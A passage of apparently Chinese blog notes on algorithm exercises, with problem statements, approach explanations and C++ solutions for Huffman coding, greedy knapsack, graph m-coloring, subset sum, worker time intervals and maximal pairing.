<span class="comment">//存储最优值的位置</span></span><br><span class="line">            maxpos = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; a[maxpos] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="comment">//从后向前遍历的,因此所有最大递增子序列均在maxpos之后</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = maxpos + <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[maxpos] == dp[i] + <span class="number">1</span> &amp;&amp; a[maxpos] &gt; a[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">            maxpos = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h1><p><br></p>
<h3 id="问题-B-哈夫曼编码"><a href="#问题-B-哈夫曼编码" class="headerlink" title="问题 B: 哈夫曼编码"></a>问题 B: 哈夫曼编码</h3><h5 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p>
<h5 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h5><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p>
<h5 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h5><p>对于每个字符串，输出其哈夫曼编码长度</p>
<h5 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure>
<h5 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">51</span></span><br><span class="line"><span class="number">115</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>哈夫曼编码的思路不难，主要讲一下优先级队列的使用。</p>
<p>在STL里有这个priority_queue，实现优先队列的结构，在优先队列中，优先级高的元素先出队列。</p>
<p>模板声明(3个参数)：<code>priority_queue&lt;Type, Container, Functional&gt;</code></p>
<ul>
<li>Type 为数据类型</li>
<li>Container 为保存数据的容器， 必须是用数组实现的容器，比如 <code>vector</code>、 <code>deque</code> 但不能用 <code>list</code>。默认用的是 <code>vector</code></li>
<li>Functional 为元素比较方式，默认用 <code>operator&lt;</code> , 即队头元素最大。</li>
</ul>
<p>所以如果后面俩个参数缺省的话，优先队列就是大顶堆，队头元素最大。</p>
<p>如果要用到小顶堆，则一般要把模板的三个参数都带进去。STL里面定义了一个仿函数 <code>greater&lt;&gt;</code>，对于基本类型可以用这个仿函数声明小顶堆<code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;q;</code>，即队头元素最小。对于自定义类型，则必须自己重载 <code>operator&lt;</code> 或者自己写比较函数。</p>
<p>优先级队列的几个操作：</p>
<ul>
<li><code>empty()</code>  如果优先队列为空，则返回真 </li>
<li><code>pop()</code>    删除第一个元素 </li>
<li><code>push()</code>  插入一个元素 </li>
<li><code>size()</code>  返回优先队列中拥有的元素的个数 </li>
<li><code>top()</code>     返回优先队列中有最高优先级的元素<h5 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">1505</span>];</span><br><span class="line">        <span class="comment">//存放每个字母的频率</span></span><br><span class="line">        <span class="keyword">int</span> n[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            n[s[i] - <span class="string">'a'</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//建立一个优先级队列</span></span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (n[i] &gt; <span class="number">0</span>)</span><br><span class="line">                q.push(n[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//不断更新优先级队列</span></span><br><span class="line">        <span class="keyword">while</span> (q.size() &gt;= <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> b = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> temp = a + b;</span><br><span class="line">            q.push(temp);</span><br><span class="line">            sum += temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><br></p>
<h3 id="问题-D-Homework"><a href="#问题-D-Homework" class="headerlink" title="问题 D: Homework"></a>问题 D: Homework</h3><h5 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h5><p>临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p>
<p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p>
<p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p>
<p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p>
<h5 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h5><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p>
<h5 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h5><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p>
<p>提示：float 的精度可能不够，你应该使用 double 类型。</p>
<h5 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">20</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">10</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">22</span></span><br><span class="line"><span class="symbol">10 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">37<span class="selector-class">.00</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>0-1背包类的贪心算法，计算物品性价比，按性价比从大到小排序，优先装入性价比大的，直到容量满为止。</p>
<h5 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">paper</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> t, v;</span><br><span class="line">    <span class="keyword">double</span> cost; <span class="comment">//性价比</span></span><br><span class="line">&#125; paper[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct paper a, struct paper b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.cost &gt; b.cost;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, c;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; c)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; c == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; paper[i].t &gt;&gt; paper[i].v;</span><br><span class="line">            <span class="comment">//计算每张试卷的性价比</span></span><br><span class="line">            paper[i].cost = paper[i].v / paper[i].t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//按性价比排序</span></span><br><span class="line">        sort(paper, paper + n, cmp);</span><br><span class="line">        <span class="keyword">double</span> max = <span class="number">0</span>, time = c;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (paper[i].t &lt;= time)</span><br><span class="line">            &#123;</span><br><span class="line">                max += paper[i].v;</span><br><span class="line">                time -= paper[i].t;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//得到部分价值(时间*性价比)</span></span><br><span class="line">                max += time * paper[i].cost;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf("%.2f\n", max);</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; max &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><p><br></p>
<h3 id="图的m着色问题"><a href="#图的m着色问题" class="headerlink" title="图的m着色问题"></a>图的m着色问题</h3><h5 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p>
<h5 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h5><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p>
<h5 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h5><p>所有不同的着色方案数</p>
<h5 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">8</span> <span class="number">4</span> </span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span> </span><br><span class="line"><span class="symbol">1 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">5</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure>
<h5 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e3</span> + <span class="number">5</span>;</span><br><span class="line"><span class="comment">//n个顶点，k条边，m种颜色</span></span><br><span class="line"><span class="keyword">int</span> n, k, m, res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> color[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d == n + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//m种颜色</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//深度优先,若相邻且有子节点同样上了i颜色,则剪去</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[d][j] == <span class="number">1</span> &amp;&amp; color[j] == i)</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>) <span class="comment">//可行</span></span><br><span class="line">        &#123;</span><br><span class="line">            color[d] = i; <span class="comment">//上色</span></span><br><span class="line">            dfs(d + <span class="number">1</span>);   <span class="comment">//递归下一节点</span></span><br><span class="line">            color[d] = <span class="number">0</span>; <span class="comment">//恢复颜色</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1, tmp2;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tmp1 &gt;&gt; tmp2;</span><br><span class="line">        <span class="built_in">map</span>[tmp1][tmp2] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">map</span>[tmp2][tmp1] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="部分和问题"><a href="#部分和问题" class="headerlink" title="部分和问题"></a>部分和问题</h3><h5 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p>
<h5 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例。</p>
<p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p>
<p>1≤N≤20，输入整数及k均小于1e8。</p>
<h5 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h5><p>若可以使得和为k，输出”Yes”,否则”No”。</p>
<h5 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">4</span> <span class="number">7</span></span><br><span class="line"><span class="number">13</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="literal">Yes</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>每个数有加或不加两种可能，可以构造一棵二叉树，深度优先遍历，终止调节为和达到要求（返回true），遍历完全（返回false）。</p>
<h5 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">int</span> n, k, d[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sum == k)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (l == n)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(l + <span class="number">1</span>, sum) || dfs(l + <span class="number">1</span>, sum + d[l]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; d[i];</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line">        <span class="keyword">if</span> (dfs(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Yes"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><br></p>
<h3 id="法师康的工人"><a href="#法师康的工人" class="headerlink" title="法师康的工人"></a>法师康的工人</h3><h5 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h5><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p>
<p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p>
<p>·最长的至少有一个工人在工作的时间段</p>
<p>·最长的无人工作的时间段（从有人工作开始计）</p>
<h5 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h5><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p>
<h5 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h5><p>输出为一行，用空格分隔开两个我们所求的数。</p>
<h5 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="symbol">200 </span><span class="number">1000</span></span><br><span class="line"><span class="symbol">700 </span><span class="number">1100</span></span><br><span class="line"><span class="symbol">1500 </span><span class="number">2100</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">900 </span><span class="number">400</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><ul>
<li><p>先按开始时间排序，然后对每个人进行遍历。</p>
</li>
<li><p>如果前人的结束时间小于后人的开始时间，那么中间这段连续时间是没有人的，则更新最长的无人工作的时间。</p>
</li>
<li><p>如果前人的结束时间大于后人的开始时间，就比较两者结束的时间，从前人开始时间到两者间更晚结束的时间内都至少有一个人在，因此更新最长的至少有一个工人在工作的时间。</p>
</li>
<li><p>不断更新直到最后一个人。</p>
<h5 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">5005</span>;</span><br><span class="line"><span class="keyword">int</span> b[maxn], e[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> s, e;</span><br><span class="line">&#125; worker[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct data a, struct data b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.s &lt; b.s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, sb, nb;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; worker[i].s &gt;&gt; worker[i].e;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(worker, worker + n, cmp);</span><br><span class="line">    sb = worker[<span class="number">0</span>].e - worker[<span class="number">0</span>].s;</span><br><span class="line">    nb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (worker[i].s &lt;= worker[j].e)</span><br><span class="line">        &#123;</span><br><span class="line">            worker[j].e = max(worker[i].e, worker[j].e);</span><br><span class="line">            sb = max(sb, worker[j].e - worker[j].s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            nb = max(nb, worker[i].s - worker[j].e);</span><br><span class="line">            j = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sb &lt;&lt; <span class="string">" "</span> &lt;&lt; nb &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><br></p>
<p><br></p>
<h3 id="配对元素"><a href="#配对元素" class="headerlink" title="配对元素"></a>配对元素</h3><h5 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h5><p>给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。</p>
<h5 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h5><p>输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。  第3行包含n个整数，题目中的B序列。</p>
<h5 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h5><p>一个数，最大配对</p>
<p>3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20；  对于30%的数据，有n≤100；  对于50%的数据，有n≤1000；  对于100%的数据，有n≤10000；a[i]，b[i]≤1000。</p>
<h5 id="样例输入-16"><a href="#样例输入-16" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">5</span> <span class="number">6</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">4</span> <span class="number">6</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-16"><a href="#样例输出-16" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">14</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>将两个数组分别进行升序和降序排列，然后让一个数组的最大值与另一个数组的最小值相减，依次类推，然后累和即可。</p>
<h5 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn], b[maxn];</span><br><span class="line"><span class="keyword">int</span> n, sum;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 